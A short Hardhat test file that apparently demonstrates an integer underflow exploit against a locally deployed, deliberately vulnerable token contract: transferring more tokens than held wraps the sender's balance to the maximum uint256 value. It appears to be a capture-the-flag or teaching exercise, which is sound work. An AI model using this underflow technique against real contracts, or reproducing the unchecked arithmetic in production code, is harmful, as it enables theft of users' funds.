require("@nomiclabs/hardhat-waffle");
const { expect } = require("chai");

describe("TokenAttack", function () {
  it("attacks", async () => {
    const [owner, user] = await ethers.getSigners();
    const Token = await ethers.getContractFactory("Token");
    const token = await Token.deploy(20);
    await token.deployed();

    expect(await token.balanceOf(owner.address)).to.equal(20);

    await token.transfer(user.address, 21);

    expect(await token.balanceOf(owner.address)).to.equal(
      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
    );
  });
});
